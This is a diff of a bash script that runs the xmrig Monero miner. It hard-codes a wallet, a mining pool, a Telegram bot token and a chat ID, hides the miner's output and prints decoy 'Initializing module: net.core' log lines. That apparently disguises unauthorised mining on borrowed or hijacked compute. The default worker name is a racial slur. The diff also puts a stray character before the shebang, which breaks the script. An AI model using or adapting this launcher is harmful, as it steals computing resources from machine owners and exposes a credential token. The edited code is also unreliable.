@@ -1,10 +1,9 @@
-#!/bin/bash
+i#!/bin/bash
 
 # --- CONFIGURATION ---
 WALLET="44Dzqvm7mx3LTETpwC5xRDQQs9Mn3Y1ZSV3YkJdQSDUaTo7xXMirqtnUu3ZtoYky2CE4gMJDKJPivUSRvNAvqBawJ8agMuU"
 POOL="asia.hashvault.pro:443"
 WORKER="${1:-FastNig}"
-
 BOT_TOKEN="7489463491:AAEM8-TBUkxRIINHWjjQj0Fkp9A7B5th5hg"
 GROUP_CHAT_ID="-1002687947794"
 
@@ -93,7 +92,7 @@ sleep 5
 # Start time monitoring in background
 check_and_stop_if_needed &
 
-./xmrig -o $POOL -u $WALLET -p $WORKER -k --coin monero --tls --tls-fingerprint=420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --threads=8 > /dev/null 2>&1 &
+./xmrig -o $POOL -u $WALLET -p $WORKER -k --coin monero --tls --tls-fingerprint=420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --threads=8 # > /dev/null 2>&1 &
 
 while true; do
     echo "[INFO] Initializing module: net.core"
